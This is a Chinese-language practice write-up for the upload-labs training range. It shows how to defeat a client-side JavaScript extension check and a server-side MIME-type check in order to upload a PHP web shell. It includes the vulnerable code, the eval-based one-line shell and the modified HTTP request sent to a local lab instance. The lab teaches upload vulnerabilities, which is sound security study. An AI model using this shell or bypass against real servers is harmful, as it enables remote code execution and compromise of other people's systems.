# 攻击靶场练习

## 准备工作

靶场源代码

- [upload-labs](https://github.com/c0ny1/upload-labs) 可利用docker 跑起来

抓包工具
- [Burp Suite 社区版本](https://portswigger.net/burp/communitydownload) 社区版本即可

中国蚁剑
- [antSword](https://github.com/AntSwordProject/antSword)
- [使用文档](https://www.yuque.com/antswordproject/antsword/ff5pl5)


## 练习

### 第一题：上传一个webshell到服务器。
限制： 这个题目只有在前端控制了是否能上传 （该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php）
破解： 移除js的控制（换句话来说，去掉javascript使用）可上传

```js
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```


### 第二题：后端限制了上传类型

```js
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

可利用burp suit抓包工具 抓到该请求，然后修改context-type 重新发送请求

```md
POST /Pass-02/index.php HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------7445055365470728562651083717
Content-Length: 367
Origin: http://localhost:8000
Connection: close
Referer: http://localhost:8000/Pass-02/index.php
Cookie: _horizon_uid=d0e649d9-848b-4d52-be8e-92c947add7b2; ts_uid=1096465488
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------7445055365470728562651083717
Content-Disposition: form-data; name="upload_file"; filename="ant.php"
Content-Type: image/gif (此处为修改位置)

<?php eval($_POST['ant']); ?>

-----------------------------7445055365470728562651083717
Content-Disposition: form-data; name="submit"

上传
-----------------------------7445055365470728562651083717--
```



[upload-libs 参考答案](https://cloud.tencent.com/developer/article/1906120)